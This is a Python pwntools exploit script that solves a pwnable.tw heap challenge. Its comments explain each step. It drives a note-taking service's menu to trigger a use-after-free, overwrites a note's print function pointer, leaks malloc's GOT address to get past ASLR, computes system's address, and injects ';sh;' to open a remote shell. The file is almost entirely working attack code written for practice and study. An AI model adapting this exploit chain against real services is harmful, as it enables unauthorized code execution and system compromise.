from pwn import *


HOST = "chall.pwnable.tw"
PORT = 10102

conn = None


def add_note(size, content):
    """
    Performs the add note function from the menu screen.
    """

    log.info("Adding note of size %s." % hex(size))
    conn.sendafter(':', '1')  # Selecting "Add note"
    conn.sendafter(':', str(size))  # Giving the size.
    conn.sendafter(':', content)  # Writing the content.


def delete_note(index):
    """
    Performs the delete note function from the menu screen.
    """

    log.info("Deleting note at index %d." % index)
    conn.sendafter(':', '2')  # Selecting "Delete note"
    conn.sendafter(':', str(index))  # Sending the index of the note to delete


def print_note(index):
    """
    Performs the print note function from the menu screen.
    """

    log.info("Printing note at index %d." % index)
    conn.sendafter(':', '3')  # Selecting "Print note"
    conn.sendafter(':', str(index))  # Sending the index of the note to print


def main():
    global conn  # Modifying a global variable.
    conn = remote(HOST, PORT)  # Connecting to remote host.

    print_func_ptr = 0x0804862B  # The print function in every note.
    malloc_got_ptr = 0x0804A020  # Ptr to malloc entry in the GOT.
    malloc_ptr = 0  # Ptr to malloc.
    system_ptr = lambda: malloc_ptr - 218912  # Calculated ptr to system

    # Leaking libc ptr to malloc, allowing us to calculate where system is.
    add_note(24, 'A'*24)  # Adding 2 notes of relative large size.
    add_note(24, 'B'*24)
    delete_note(0)  # Free both the new notes.
    delete_note(1)
    # We will now cause the heap allocator to allocate a freed bin for our
    # new note. Since this note is 8B, it is a perfect fit for the previously
    # allocated note header. That means our old node at index 0, will have its
    # header overwritten with the contents of our new note. Since the ptr to
    # the old note is still held and usable via the print function, we can
    # exploit this use after free condition by overwriting the print_func
    # function pointer that exists on the header of every note.
    #
    # Since ASLR is turned on, we need to first establish where key libc
    # functions are. To do this, we will leak a libc address and apply an
    # offset to calculate the address of system. Here I am printing an entry
    # in the GOT, specifically the entry for malloc.
    add_note(8, p32(print_func_ptr) + p32(malloc_got_ptr))
    # Trigger the exploit by calling print on the old freed note.
    print_note(0)
    # Read the address that it spits out.
    malloc_ptr = u32(conn.recv(4))

    # It's simple to calculate the offset from malloc to system, and we know
    # this will be the same for every run. That means we can know where system
    # is every time as long as we get the correct address to malloc.
    # system_ptr is a lambda function that calculates this offset.
    log.info("System @ %s." % hex(system_ptr()))

    # Delete the last note we made to return the system into the state it was
    # in before we created the note to overwrite the old note's headers.
    delete_note(2)
    # Create our actual exploit note. Note that I am not pushing an address to
    # /bin/sh. The reason is because the print_note function calls the
    # print_func in each note with a pointer to the note itself, and not a ptr
    # to the note contents. That means, trying to do a traditional call to
    # system will result in a result like: system(system_ptr+binsh_ptr). To
    # resolve this issue, we use a clever trick. The system function executes
    # a shell command, and since most shells allow you to execute multiple
    # commands in succession regardless of whether any of them fail using ';',
    # we will use this to call /bin/sh. Now the result will be similar to this
    # system(system_ptr+";sh;"), which is essentially doing system_ptr;sh; in
    # a normal Unix shell.
    add_note(8, p32(system_ptr()) + ";sh;")
    print_note(0)  # Triggering the final exploit.
    conn.clean(1)  # Cleaning up extraneous server responses.

    conn.interactive()  # Interract with the shell.


if __name__ == "__main__":
    main()

